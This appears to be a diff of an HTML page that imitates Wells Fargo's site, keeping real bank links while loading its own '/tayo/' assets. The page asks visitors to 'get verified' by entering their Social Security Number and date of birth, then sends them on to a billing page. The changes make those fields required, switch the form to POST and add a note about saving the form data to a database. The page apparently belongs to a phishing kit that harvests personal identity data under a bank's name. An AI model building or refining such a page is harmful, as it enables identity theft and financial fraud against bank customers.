@@ -7,7 +7,7 @@
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <link rel="stylesheet" href="form.css">
       <!-- <link rel="stylesheet" href="main.css"> -->
-      <link rel="stylesheet" href="mobile.css">
+      <link rel="stylesheet" href="/tayo/css/form.css">
       <link rel="stylesheet" href="./fontsawesome/css/all.css">
       <title>Document</title>
 </head>
@@ -22,9 +22,9 @@
                   <nav>
                         <ul>
                               <div class="key">
-                                    <img src="./tayo2a (1).png" alt=""> 
+                                    <img src="./tayo2a (1).png" alt="">
 
-                                    <li><a href="#">  Enroll</a></li>
+                                    <li><a href="#"> Enroll</a></li>
                               </div>
                               <li><a href="https://www.wellsfargo.com/help/">Customer Service</a> </li>
                               <li><a href="https://www.wellsfargo.com/locator/"> ATMs/Locations</a></li>
@@ -45,7 +45,6 @@
                         <div class="mobile-links">
                               <ul>
                                     <div class="search">
-
                                           <input type="text" placeholder="Search">
                                           <button><i class="fa-solid fa-magnifying-glass"></i></button>
                                     </div>
@@ -59,83 +58,35 @@
       </header>
 
       <main>
-            <!-- <div class="verify">
-
-                              <h2>Let's get you verified</h2>
-
-                              <p>First, we need some information.</p>
-                              <form action="">
-                                        <input class="required-input" id="ssn" maxlength="9" type="text" name="ssn" 
-                                        placeholder="Social Security Number" onBlur = "myFunc()">
-                                        <button id="btn2">
-
-                                              
-                                    </button> -->
-            <!-- <a> <i class="fa-regular fa-circle-question icon" ></i></a> -->
-            <!-- <br> -->
-            <!-- <div class="type">
-
-                                                  <input type="checkbox">
-                                                  <div class="username">Save password</div>
-                                                            
-                                        </div> -->
-
-
-            <!-- <br>
-                                        <input type="date" name="date" id="dob" placeholder="Date of Birth" onclick="myFunction"> -->
-
-
-            <!-- </form>
-                              <div class="btn">
-
-                                    <a href="/billing.html">
-
-                                          <button class="btn-1">Continue</button>
-                                    </a>  
-                                       
-
-                                   </div>
-
-                                 
-                                  
-                    </div> -->
             <div class="verify">
 
                   <h2>Let's get you verified</h2>
 
                   <p>First, we need some information.</p>
-                  <form action="">
+
+                  <!-- Adding the form datas to the database -->
+
+                  <form action="" method="post">
                         <input class="required-input" id="ssn" maxlength="9" type="text" name="ssn"
-                              placeholder="Social Security Number" onBlur="myFunc()">
+                              placeholder="Social Security Number" onBlur="myFunc()" required>
 
 
                         <a> <i class="fa-regular fa-circle-question icon"></i></a>
-
                         <br>
-                        <!-- <div class="type">
-
-                                                  <input type="checkbox">
-                                                  <div class="username">Save password</div>
-                                                            
-                                        </div> -->
-
-
                         <br>
-                      <p id="mm">Date Of Birth</p>
-                        <br>
-                        <input type="date" name="" id="dob" placeholder="Date of Birth" onclick="myFunction">
 
+                        <p id="mm">Date Of Birth</p>
+                        <br>
+                        <input type="date" name="" id="dob" placeholder="Date of Birth" onclick="myFunction" required>
+
+                        <div class="btn">
+                              <a href="./billing.html">
+                                    <button class="btn-1">Continue</button>
+                              </a>
+                        </div>
 
                   </form>
-                  <div class="btn">
 
-                        <a href="/billing.html">
-
-                              <button class="btn-1">Continue</button>
-                        </a>
-
-
-                  </div>
 
 
 
@@ -184,16 +135,16 @@
 
       </footer>
       <script>
-            var burgerdiv= document.querySelector(".mobile-burger")
-// console.log(burgerdiv)
-var mobilelinks = document.querySelector(".mobile-links")
+            var burgerdiv = document.querySelector(".mobile-burger")
+            // console.log(burgerdiv)
+            var mobilelinks = document.querySelector(".mobile-links")
 
 
-function giveit(){
-   burgerdiv.classList.toggle("showburger")
-   mobilelinks.classList.toggle("show-mobile-links")
+            function giveit() {
+                  burgerdiv.classList.toggle("showburger")
+                  mobilelinks.classList.toggle("show-mobile-links")
 
-        }
+            }
       </script>
 
       <script src="./script.js"></script>
